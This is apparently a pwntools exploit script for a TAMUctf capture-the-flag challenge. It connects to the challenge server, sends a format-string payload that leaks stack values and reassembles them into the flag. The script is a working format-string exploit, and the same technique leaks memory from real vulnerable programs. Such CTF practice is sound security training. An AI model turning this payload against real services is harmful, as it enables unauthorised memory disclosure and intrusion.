from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = ""
HOST = "challenges.tamuctf.com"
PORT = 4251 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#libc = ELF('./')
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	fsb_off = 8
	payload = "%8$p,%9$p,%10$p,%11$p,%12$p,%13$p,"
	conn.recvline()
	conn.sendline(payload)
	flag = ""
	for i in range(3):
		s = int(conn.recvuntil(",")[:-1], 16)
		flag += p64(s)	
	print flag
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
